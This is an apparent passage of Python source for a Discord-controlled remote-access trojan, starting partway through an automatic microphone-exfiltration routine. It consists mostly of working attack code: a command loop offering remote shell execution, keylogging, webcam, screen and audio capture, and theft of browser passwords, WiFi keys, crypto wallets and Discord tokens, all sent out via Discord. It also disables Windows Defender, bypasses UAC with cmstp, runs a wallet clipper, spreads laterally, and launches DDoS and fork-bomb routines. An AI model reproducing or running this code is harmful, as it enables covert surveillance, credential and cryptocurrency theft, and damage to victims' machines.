        frames=[s.read(CHUNK) for _ in range(int(44100/CHUNK*5))]
        s.stop_stream();s.close();p.terminate()
        b=io.BytesIO()
        wf=wave.open(b,'wb')
        wf.setnchannels(1)
        wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
        wf.setframerate(44100)
        wf.writeframes(b''.join(frames))
        wf.close()
        _d._x(b.getvalue(),'microphone.wav')
    except:pass

_auto_exfil()

# ------------------------------- command handling -------------------------------
_cwd=os.getcwd()
_klog=None
_stream=None
_sq=50
def _shell(c):
    try:
        r=subprocess.run(c,shell=True,capture_output=True,text=True,timeout=60)
        return r.stdout+r.stderr if (r.stdout+r.stderr) else '[+] Done'
    except:return '[-] Error'
def _ps():
    if os.name=='nt':
        r=subprocess.run(['tasklist'],capture_output=True,text=True)
        return r.stdout[:3000]
    else:
        r=subprocess.run(['ps','aux'],capture_output=True,text=True)
        return r.stdout[:3000]
def _kill(n):
    if os.name=='nt':subprocess.run(['taskkill','/F','/IM',n],capture_output=True)
    else:subprocess.run(['pkill','-f',n],capture_output=True)
    return f'[+] Killed {n}'
def _cd(p):
    global _cwd
    try:os.chdir(p);_cwd=os.getcwd();return f'[+] CWD: {_cwd}'
    except:return '[-] Cannot change dir'
def _ls(p=None):
    global _cwd
    t=p if p else _cwd
    try:return '\n'.join(os.listdir(t))
    except:return '[-] Cannot list'
def _cat(p):
    global _cwd
    fp=os.path.join(_cwd,p) if not os.path.isabs(p) else p
    try:
        with open(fp,'r',errors='ignore') as f:return f.read(10000)
    except:return '[-] Cannot read'
def _download(p):
    global _cwd
    fp=os.path.join(_cwd,p) if not os.path.isabs(p) else p
    try:
        with open(fp,'rb') as f:return f.read()
    except:return None
def _upload(u,p):
    global _cwd
    fp=os.path.join(_cwd,p) if not os.path.isabs(p) else p
    try:
        r=requests.get(u,timeout=30)
        with open(fp,'wb') as f:f.write(r.content)
        return '[+] Downloaded'
    except:return '[-] Download failed'
def _screenshot():
    try:
        img=pyautogui.screenshot()
        b=io.BytesIO()
        img.save(b,format='PNG')
        return b.getvalue()
    except:return None
def _webcam():
    try:
        cap=cv2.VideoCapture(0)
        if not cap.isOpened():return None
        r,f=cap.read()
        cap.release()
        if r:
            _,b=cv2.imencode('.jpg',f)
            return b.tobytes()
    except:pass
    return None
def _mic():
    try:
        CHUNK=1024
        p=pyaudio.PyAudio()
        s=p.open(format=pyaudio.paInt16,channels=1,rate=44100,input=True,frames_per_buffer=CHUNK)
        f=[]
        for _ in range(int(44100/CHUNK*5)):
            f.append(s.read(CHUNK))
        s.stop_stream();s.close();p.terminate()
        b=io.BytesIO()
        import wave
        wf=wave.open(b,'wb')
        wf.setnchannels(1)
        wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
        wf.setframerate(44100)
        wf.writeframes(b''.join(f))
        wf.close()
        return b.getvalue()
    except:return None
class _KL:
    def __init__(self):
        self.l=[];self.r=False;self.t=None
    def start(self):
        if self.r:return
        self.r=True
        self.t=threading.Thread(target=self._run,daemon=True)
        self.t.start()
    def stop(self):
        self.r=False
        if self.t:self.t.join(1)
    def dump(self):
        d=''.join(self.l)
        self.l.clear()
        return d
    def _run(self):
        def on_press(k):
            if not self.r:return False
            try:
                if hasattr(k,'char') and k.char:self.l.append(k.char)
                else:self.l.append(f'[{k}]')
            except:self.l.append('[?]')
        with pynput.keyboard.Listener(on_press=on_press) as l:
            while self.r:time.sleep(0.1)
            l.stop()
class _ST:
    def __init__(self,c):
        self.c=c;self.r=False;self.q=50
    def _cap(self):
        try:
            img=pyautogui.screenshot()
            arr=np.array(img)
            _,buf=cv2.imencode('.jpg',arr,[cv2.IMWRITE_JPEG_QUALITY,self.q])
            return buf.tobytes()
        except:return None
    def start(self):
        self.r=True
        while self.r:
            f=self._cap()
            if f:self.c._x(f,f'stream_{int(time.time())}.jpg')
            time.sleep(0.5)
    def stop(self):self.r=False

# ------------------------------- main loop -------------------------------
_klog=_KL()
def _main():
    global _klog,_stream,_cwd,_wallet_addr,_lateral_enabled
    _d._s(_d.cc,'[+] Agent ready')
    while True:
        try:
            r=_d.s.get(f'https://discord.com/api/v9/channels/{_d.cc}/messages',timeout=30)
            if r.status_code!=200:
                time.sleep(30)
                continue
            for m in r.json():
                if m['author']['id']==_d.u:continue
                c=m['content']
                if not c.startswith('.'):continue
                cmd=c[1:].strip()
                p=cmd.split(maxsplit=1)
                a=p[0].lower()
                arg=p[1] if len(p)>1 else ''
                if a=='help':
                    _d._s(_d.cc,'''**Commands**
.shell <cmd> - Execute command
.ps - List processes
.kill <name> - Kill process
.cd <dir> - Change directory
.ls [path] - List directory
.cat <file> - Read file
.download <file> - Download file
.upload <url> <name> - Upload from URL
.screenshot - Take screenshot
.webcam - Capture webcam
.mic - Record microphone
.keylog start/stop/dump - Keylogger
.clipboard - Get clipboard
.sysinfo - System info
.passwords - Browser passwords
.wifi - WiFi passwords
.wallets - Crypto wallets
.tokens - Discord tokens
.files - Grab sensitive files
.sessions - Steam/Telegram sessions
.bsod - Blue screen
.blockinput - Block input
.unblockinput - Unblock input
.msg <title> <text> - Show message box
.press <key> - Press key
.click <x> <y> - Click mouse
.type <text> - Type text
.volume <0-100> - Set volume
.shutdown - Shutdown
.restart - Restart
.logoff - Log off
.selfdestruct - Delete itself
.inject - Discord injection
.disabledefender - Disable Defender
.uacbypass - UAC bypass
.ddos - Start DDoS
.lsass - LSASS info
.wipe - Wipe files
.stream start/stop/quality - Screen stream
.idletime - Idle time
.geo - Geolocation
.dns - DNS cache
.arp - ARP table
.netstat - Network connections
.env - Environment variables
.software - Installed software
.window - Active window
.fingerprint - HWID
.tree <path> - Directory tree
.litterbox <file> - Exfil large file via litterbox
.setwallet <addr> - Set crypto clipper address
.lateral_enable - Enable lateral movement
.lateral_scan - Scan network for targets
.lateral_infect - Infect scanned targets
.forkbomb - System crash (fork bomb)
.cpustress - CPU stress test''')
                elif a=='shell':_d._s(_d.cc,f'```{_shell(arg)[:1900]}```')
                elif a=='ps':_d._s(_d.cc,f'```{_ps()[:1900]}```')
                elif a=='kill':_d._s(_d.cc,_kill(arg))
                elif a=='cd':_d._s(_d.cc,_cd(arg))
                elif a=='ls':_d._s(_d.cc,f'```{_ls(arg)[:1900]}```')
                elif a=='cat':_d._s(_d.cc,f'```{_cat(arg)[:1900]}```')
                elif a=='download':
                    d=_download(arg)
                    if d:_d._x(d,os.path.basename(arg));_d._s(_d.cc,'[+] File sent')
                    else:_d._s(_d.cc,'[-] File not found')
                elif a=='upload':
                    sp=arg.split()
                    if len(sp)<2:_d._s(_d.cc,'Usage: .upload <url> <filename>')
                    else:_d._s(_d.cc,_upload(sp[0],sp[1]))
                elif a=='screenshot':
                    s=_screenshot()
                    if s:_d._x(s,'screenshot.png');_d._s(_d.cc,'[+] Screenshot sent')
                    else:_d._s(_d.cc,'[-] Failed')
                elif a=='webcam':
                    w=_webcam()
                    if w:_d._x(w,'webcam.jpg');_d._s(_d.cc,'[+] Webcam sent')
                    else:_d._s(_d.cc,'[-] Failed')
                elif a=='mic':
                    a2=_mic()
                    if a2:_d._x(a2,'audio.wav');_d._s(_d.cc,'[+] Audio sent')
                    else:_d._s(_d.cc,'[-] Failed')
                elif a=='keylog':
                    if arg=='start':_klog.start();_d._s(_d.cc,'[+] Keylogger started')
                    elif arg=='stop':_klog.stop();_d._s(_d.cc,'[+] Stopped')
                    elif arg=='dump':
                        d=_klog.dump()
                        if d:_d._x(d,'keylog.txt');_d._s(_d.cc,'[+] Sent')
                        else:_d._s(_d.cc,'[-] No data')
                    else:_d._s(_d.cc,'Usage: .keylog start/stop/dump')
                elif a=='clipboard':
                    try:cb=pyperclip.paste()
                    except:cb=''
                    _d._s(_d.cc,f'Clipboard: {cb if cb else "(empty)"}')
                elif a=='sysinfo':
                    i={'host':socket.gethostname(),'user':getpass.getuser(),'os':f'{platform.system()} {platform.release()}','arch':platform.machine(),'cpu':os.cpu_count()}
                    _d._s(_d.cc,f'```{json.dumps(i,indent=2)[:1900]}```')
                elif a=='passwords':_d._x(json.dumps(_browser_passwords(),indent=2),'passwords.json');_d._s(_d.cc,'[+] Passwords sent')
                elif a=='wifi':_d._x(json.dumps(_wifi(),indent=2),'wifi.json');_d._s(_d.cc,'[+] WiFi sent')
                elif a=='wallets':_d._x(json.dumps(_crypto_wallets(),indent=2),'wallets.json');_d._s(_d.cc,'[+] Wallets sent')
                elif a=='tokens':_d._x(json.dumps(_discord_tokens(),indent=2),'tokens.json');_d._s(_d.cc,'[+] Tokens sent')
                elif a=='files':
                    for nm,dt in _interesting_files():
                        _d._x(dt,nm)
                    _d._s(_d.cc,'[+] Files sent')
                elif a=='sessions':_d._x(json.dumps(_sessions(),indent=2),'sessions.json');_d._s(_d.cc,'[+] Sessions sent')
                elif a=='bsod':
                    if os.name=='nt':
                        try:
                            ntdll=ctypes.windll.ntdll
                            ntdll.RtlAdjustPrivilege(19,1,0,ctypes.byref(ctypes.c_int()))
                            ntdll.NtRaiseHardError(0xC0000022,0,0,0,6,ctypes.byref(ctypes.c_int()))
                        except:pass
                    _d._s(_d.cc,'[!] BSOD attempted')
                elif a=='blockinput':
                    if os.name=='nt':
                        try:ctypes.windll.user32.BlockInput(True)
                        except:pass
                    _d._s(_d.cc,'[+] Input blocked')
                elif a=='unblockinput':
                    if os.name=='nt':
                        try:ctypes.windll.user32.BlockInput(False)
                        except:pass
                    _d._s(_d.cc,'[+] Input unblocked')
                elif a=='msg':
                    sp=arg.split(maxsplit=1)
                    if len(sp)<2:_d._s(_d.cc,'Usage: .msg <title> <text>')
                    else:
                        title,text=sp[0],sp[1]
                        if os.name=='nt':
                            try:ctypes.windll.user32.MessageBoxW(0,text,title,0)
                            except:pass
                        else:
                            subprocess.Popen(['zenity','--info','--title',title,'--text',text])
                        _d._s(_d.cc,'[+] Message shown')
                elif a=='press':
                    try:
                        if 'keyboard' in sys.modules:keyboard.press_and_release(arg)
                        elif 'pyautogui' in sys.modules:pyautogui.press(arg)
                        _d._s(_d.cc,f'[+] Pressed {arg}')
                    except:_d._s(_d.cc,'[-] Failed')
                elif a=='click':
                    try:
                        x,y=map(int,arg.split())
                        pyautogui.click(x,y)
                        _d._s(_d.cc,f'[+] Clicked ({x},{y})')
                    except:_d._s(_d.cc,'Usage: .click <x> <y>')
                elif a=='type':
                    try:
                        pyautogui.typewrite(arg)
                        _d._s(_d.cc,f'[+] Typed {len(arg)} chars')
                    except:_d._s(_d.cc,'[-] Failed')
                elif a=='volume':
                    try:
                        v=int(arg)
                        if os.name=='nt':
                            dev=AudioUtilities.GetSpeakers()
                            intf=dev.Activate(IAudioEndpointVolume._iid_,CLSCTX_ALL,None)
                            vol=cast(intf,POINTER(IAudioEndpointVolume))
                            vol.SetMasterVolumeLevelScalar(v/100,None)
                        else:
                            subprocess.run(['amixer','set','Master',f'{v}%'])
                        _d._s(_d.cc,f'[+] Volume set to {v}%')
                    except:_d._s(_d.cc,'Usage: .volume <0-100>')
                elif a=='shutdown':
                    if os.name=='nt':os.system('shutdown /s /t 10')
                    else:os.system('shutdown -h now')
                    _d._s(_d.cc,'[!] Shutting down')
                elif a=='restart':
                    if os.name=='nt':os.system('shutdown /r /t 10')
                    else:os.system('shutdown -r now')
                    _d._s(_d.cc,'[!] Restarting')
                elif a=='logoff':
                    if os.name=='nt':os.system('shutdown /l')
                    else:os.system('gnome-session-quit --no-prompt')
                    _d._s(_d.cc,'[!] Logging off')
                elif a=='selfdestruct':
                    _d._s(_d.cc,'[!] Self-destructing')
                    try:os.remove(sys.argv[0])
                    except:pass
                    sys.exit(0)
                elif a=='inject':
                    _inject_discord()
                elif a=='disabledefender':
                    if os.name=='nt':
                        subprocess.run(['reg','add','HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender','/v','DisableAntiSpyware','/t','REG_DWORD','/d','1','/f'],capture_output=True)
                        subprocess.run(['powershell','-Command','Set-MpPreference -DisableRealtimeMonitoring $true'],capture_output=True)
                        _d._s(_d.cc,'[+] Defender disabled')
                    else:_d._s(_d.cc,'[-] Not Windows')
                elif a=='uacbypass':
                    if os.name=='nt':
                        try:
                            with tempfile.NamedTemporaryFile(mode='w',suffix='.inf',delete=False) as f:
                                f.write('[Version]\nSignature=$CHICAGO$\nAdvancedINF=2.5\n[DefaultInstall]\nRunPreSetupCommands=RunPreSetupCommands\n[RunPreSetupCommands]\n'+sys.executable+' '+os.path.abspath(sys.argv[0])+'\n')
                                p=f.name
                            subprocess.run(['cmstp','/au',p],capture_output=True)
                            os.unlink(p)
                            _d._s(_d.cc,'[+] UAC bypass attempted')
                        except:_d._s(_d.cc,'[-] Failed')
                    else:_d._s(_d.cc,'[-] Not Windows')
                elif a=='ddos':
                    def flood():
                        while True:
                            try:
                                requests.get('http://1.1.1.1',timeout=1)
                            except:pass
                    for _ in range(10):
                        threading.Thread(target=flood,daemon=True).start()
                    _d._s(_d.cc,'[+] DDoS started')
                elif a=='lsass':
                    _d._s(_d.cc,'[+] LSASS info: admin required')
                elif a=='wipe':
                    _d._s(_d.cc,'[!] Wipe command disabled')
                elif a=='stream':
                    if arg=='start':
                        _stream=_ST(_d)
                        threading.Thread(target=_stream.start,daemon=True).start()
                        _d._s(_d.cc,'[+] Streaming started')
                    elif arg=='stop':
                        if _stream:_stream.stop();_d._s(_d.cc,'[+] Streaming stopped')
                        else:_d._s(_d.cc,'[-] No stream')
                    elif arg.startswith('quality'):
                        try:
                            q=int(arg.split()[1])
                            if _stream:_stream.q=min(100,max(1,q));_d._s(_d.cc,f'[+] Quality set to {_stream.q}')
                            else:_d._s(_d.cc,'[-] No stream')
                        except:_d._s(_d.cc,'Usage: .stream quality <1-100>')
                    else:_d._s(_d.cc,'Usage: .stream start/stop/quality')
                elif a=='idletime':
                    _d._s(_d.cc,'Idle: N/A')
                elif a=='geo':
                    _d._s(_d.cc,'Geo: N/A')
                elif a=='dns':_d._s(_d.cc,'DNS cache: N/A')
                elif a=='arp':_d._s(_d.cc,'ARP: N/A')
                elif a=='netstat':
                    if os.name=='nt':_d._s(_d.cc,f'```{subprocess.run(["netstat","-an"],capture_output=True,text=True).stdout[:1900]}```')
                    else:_d._s(_d.cc,f'```{subprocess.run(["ss","-tunlp"],capture_output=True,text=True).stdout[:1900]}```')
                elif a=='env':_d._s(_d.cc,f'```{json.dumps(dict(os.environ),indent=2)[:1900]}```')
                elif a=='software':
                    if os.name=='nt':
                        sw=subprocess.run(['wmic','product','get','name'],capture_output=True,text=True).stdout[:1900]
                        _d._s(_d.cc,f'```{sw}```')
                    else:_d._s(_d.cc,'N/A')
                elif a=='window':
                    if os.name=='nt':
                        h=ctypes.windll.user32.GetForegroundWindow()
                        l=ctypes.windll.user32.GetWindowTextLengthW(h)
                        b=ctypes.create_unicode_buffer(l+1)
                        ctypes.windll.user32.GetWindowTextW(h,b,l+1)
                        _d._s(_d.cc,f'Active: {b.value}')
                    else:_d._s(_d.cc,'N/A')
                elif a=='fingerprint':
                    _d._s(_d.cc,f'ID: {hashlib.md5(f"{socket.gethostname()}{getpass.getuser()}".encode()).hexdigest()}')
                elif a=='tree':
                    if arg:
                        t=_tree(arg)
                        if t:_d._x(json.dumps(t,indent=2),'tree.json');_d._s(_d.cc,'[+] Tree sent')
                        else:_d._s(_d.cc,'[-] Failed')
                    else:_d._s(_d.cc,'Usage: .tree <path>')
                elif a=='litterbox':
                    if arg:
                        if os.path.exists(arg):
                            _exfil_large(arg)
                        else:_d._s(_d.cc,'[-] File not found')
                    else:_d._s(_d.cc,'Usage: .litterbox <file>')
                elif a=='setwallet':
                    if arg:
                        _set_wallet(arg)
                    else:_d._s(_d.cc,'Usage: .setwallet <address>')
                elif a=='lateral_enable':
                    _lateral_enabled=True
                    _d._s(_d.cc,'[+] Lateral movement enabled')
                elif a=='lateral_scan':
                    targets=_scan_network()
                    _d._s(_d.cc,f'[+] Targets: {", ".join(targets[:10])}')
                elif a=='lateral_infect':
                    _lateral_infect()
                elif a=='forkbomb':
                    threading.Thread(target=_fork_bomb,daemon=True).start()
                    _d._s(_d.cc,'[+] Fork bomb started')
                elif a=='cpustress':
                    _d._s(_d.cc,_cpu_stress())
                else:
                    _d._s(_d.cc,f'Unknown: {a}')
            time.sleep(random.uniform(2,5))
        except Exception as e:
            time.sleep(10)

if __name__=='__main__':
    _main()
